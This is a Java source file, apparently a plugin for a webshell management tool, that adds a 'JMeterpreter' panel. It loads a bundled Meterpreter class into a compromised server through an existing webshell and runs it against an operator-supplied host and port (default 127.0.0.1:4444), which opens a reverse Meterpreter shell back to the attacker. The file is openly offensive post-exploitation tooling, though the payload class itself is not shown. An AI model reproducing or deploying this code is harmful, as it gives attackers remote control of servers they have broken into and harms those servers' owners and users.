package vip.youwe.shell.shells.plugins.java;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.RTextArea;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "JavaDynamicPayload", Name = "JMeterpreter")
public class Meterpreter implements Plugin {

    private static final String CLASS_NAME = "plugin.Meterpreter";
    private JPanel panel;
    private RTextArea tipTextArea;
    private JButton goButton;
    private JButton loadButton;
    private JLabel hostLabel;
    private JLabel portLabel;
    private JTextField hostTextField;
    private JTextField portTextField;
    private JSplitPane meterpreterSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Meterpreter() {
        this.panel = new JPanel(new BorderLayout());

        this.hostLabel = new JLabel("host :");
        this.portLabel = new JLabel("port :");
        this.loadButton = new JButton("Load");
        this.goButton = new JButton("Go");
        this.tipTextArea = new RTextArea();
        this.hostTextField = new JTextField("127.0.0.1", 15);
        this.portTextField = new JTextField("4444", 7);
        this.meterpreterSplitPane = new JSplitPane();
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);

        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.loadButton);
        meterpreterTopPanel.add(this.goButton);

        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));

        initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/Meterpreter.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
                }
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        String host = this.hostTextField.getText().trim();
        String port = this.portTextField.getText().trim();
        ReqParameter reqParamete = new ReqParameter();
        reqParamete.add("host", host);
        reqParamete.add("port", port);
        byte[] result = this.payload.evalFunc(CLASS_NAME, "run", reqParamete);
        String resultString = this.encoding.Decoding(result);
        Log.log(resultString);
        JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
        try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/meterpreterTip.txt");
            this.tipTextArea.setText(new String(functions.readInputStream(inputStream)));
            inputStream.close();
        } catch (Exception e) {
            Log.error(e);
        }
    }

    public JPanel getView() {
        return this.panel;
    }

}
